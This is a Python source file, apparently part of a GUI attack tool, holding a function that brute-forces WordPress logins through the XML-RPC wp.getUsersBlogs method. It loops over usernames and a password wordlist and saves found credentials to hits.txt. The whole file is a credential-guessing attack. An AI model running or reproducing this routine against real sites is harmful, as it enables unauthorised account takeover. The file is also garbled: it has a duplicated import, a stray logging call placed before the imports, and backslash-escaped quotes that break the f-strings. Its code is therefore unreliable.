from utils.logger import save_hit, log_event
from core.logger import log_event

log_event("scan", {"target": "example.com", "status": "open ports found"}, level="info", write_structured_file=True)
import xmlrpc.client
import os

def run_brute_force(target, usernames, wordlist_path, output_box):
    if not os.path.isfile(wordlist_path):
        output_box.insert("end", "[!] Invalid wordlist path.\n")
        return

    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        output_box.insert("end", f"[!] Error reading wordlist: {e}\n")
        return

    output_box.insert("end", f"[*] Starting brute force on {target}...\n")

    try:
        server = xmlrpc.client.ServerProxy(target)
    except Exception as e:
        output_box.insert("end", f"[!] Connection failed: {e}\n")
        return

    for user in usernames:
        output_box.insert("end", f\"\\n[*] Trying user: {user}\\n\")
        for password in passwords:
            try:
                resp = server.wp.getUsersBlogs(user, password)
                if resp:
                    output_box.insert("end", f\"[+] HIT: {user}:{password}\\n\")
                    with open(\"hits.txt\", \"a\") as hit_file:
                        hit_file.write(f\"{user}:{password}\\n\")
                    break
            except xmlrpc.client.Fault:
                continue
            except Exception as e:
                output_box.insert("end", f\"[-] Error on {user}: {e}\\n\")
                break

    output_box.insert("end", \"[*] Brute force complete.\\n\")
